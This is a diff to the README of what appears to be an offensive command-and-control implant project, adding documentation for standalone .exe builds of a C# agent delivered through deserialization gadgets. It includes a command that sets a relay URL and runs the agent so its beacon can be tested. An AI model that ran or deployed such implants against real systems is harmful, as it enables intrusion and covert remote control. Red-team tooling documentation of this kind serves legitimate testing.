@@ -109,6 +109,13 @@ by the gadget's framework tag + the target's process arch; the Persistence Manag
 the CLR-4 side for its arch. Every push to `main` recreates the `preview` prerelease
 (`build.yml`); pushing a `v*` tag publishes a stable release (`release.yml`).
 
+Each side × arch also ships a **self-running `.exe` sibling**
+(`csharp-agent-<net2|net4>-<i386|x86_64|aarch64>.exe`): the same image compiled with
+`OutputType=exe`, so the runtime entry point and the deserialization static ctor share one
+guarded `Main` — run it directly with `H_URL`/`A_URL` in the environment (e.g.
+`set H_URL=https://<relay>/ && csharp-agent-net2-i386.exe`) to isolate the beacon/transport
+from the delivery chain. The panel never fetches these; its rows name the `.dll` assets.
+
 ## License
 
 MIT — see [LICENSE](LICENSE). Usage is governed by [RESPONSIBLE_USE.md](RESPONSIBLE_USE.md) and
